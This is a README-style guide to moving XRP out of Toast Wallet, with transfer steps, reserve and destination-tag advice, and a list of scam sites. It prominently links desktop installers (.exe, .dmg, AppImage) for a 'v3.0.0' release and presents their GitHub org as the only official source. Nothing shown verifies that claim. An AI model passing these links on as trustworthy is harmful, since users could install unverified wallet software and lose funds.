<div align="center">

# How to Move XRP Out of Toast Wallet: The Complete Guide

**Covers exchanges, wallet migration, and the reserve requirement you can't send past.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **Only download from this GitHub release page or the [official Toast-Wallet GitHub org](https://github.com/Toast-Wallet).**
> toastwallet.com is currently unreachable, and `toastwallet.app` is a known phishing clone —
> see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

Whether you're cashing out, moving to an exchange, or migrating to a new wallet, moving XRP out of
Toast Wallet follows the same core process. Here's the complete picture, with links to the
specific paths for your situation.

**Step 1: Make sure you can actually access the wallet first.** You need your passphrase (or the
ability to reset it via your recovery phrase) before you can authorize any outgoing transaction.
If you're not there yet, start with our [full recovery guide]
(./how-to-recover-xrp-toast-wallet.md).

**Step 2: Decide where the XRP is going.**
- **To an exchange (Coinbase, Binance, Kraken, etc.)** — see our
  [step-by-step exchange guide](./toast-wallet-to-coinbase-binance.md). Exchanges typically
  require a **destination tag** for incoming XRP deposits; sending without one can result in lost
  or delayed funds. Read [do you need a destination tag?](./toast-wallet-destination-tag.md)
  before you send anything.
- **To a modern, actively maintained wallet** (recommended if you're not selling immediately) —
  see our [migration guide to Xaman](./migrate-toast-wallet-to-xaman.md).
- **To a hardware wallet** for long-term cold storage — see our
  [Toast Wallet vs. Ledger Nano S comparison](./toast-wallet-vs-ledger-nano-s.md).

**Step 3: Check the reserve.** You cannot send your entire balance — the XRP Ledger requires a
minimum reserve (currently around 10 XRP) to remain in any active address. Attempting to send your
full balance will fail; leave the reserve amount behind. See our full explainer on
[why Toast Wallet shows "not activated"](./toast-wallet-not-activated-20-xrp-reserve.md) for
the details.

**Step 4: Double- and triple-check the receiving address.** XRP transactions cannot be reversed.
Copy the address directly from the destination wallet or exchange, paste it, and visually verify
the first and last several characters match before confirming. This single habit prevents the vast
majority of "I sent it to the wrong place" losses reported by former users.

**Step 5: Send a small test amount first if you're unsure.** For any transfer of meaningful value,
send a small test transaction first (enough to clear the minimum reserve/fee, e.g. a few XRP), confirm
it arrives correctly, then send the rest.

**A note on scams at this stage specifically:** never use `toastwallet.app` or any website asking
for your credentials. Use only the
[official Windows](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe)
or [Mac](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg)
installer to initiate a transfer — see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

## ⚠️ Known Scams — Do Not Use These

- **"Toast Plus"** — a fraudulent lookalike app that has stolen an estimated **$5M+ in XRP** and was the subject of a 2021 federal lawsuit against Apple. Read: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **toastwallet.app** — a phishing clone of the official recovery page; anything imported here gets stolen within minutes. Read: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **Clone marketing sites** (`xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`) — unofficial, with fabricated claims about the product.
- **Anyone offering paid XRP "recovery" after you post about a loss** — this is always fraud.

Full reference: [Toast Wallet Scam Alert: Full Warning List](./toast-wallet-scam-warning-list.md). Report scams at [ic3.gov](https://www.ic3.gov).

## Related Articles

- [Can You Buy XRP With Toast Wallet?](./can-you-buy-xrp-with-toast-wallet.md)
- [Sending XRP to Coinbase or Binance](./toast-wallet-to-coinbase-binance.md)
- [Do You Need a Destination Tag?](./toast-wallet-destination-tag.md)
- [How to Migrate to Xaman Safely](./migrate-toast-wallet-to-xaman.md)
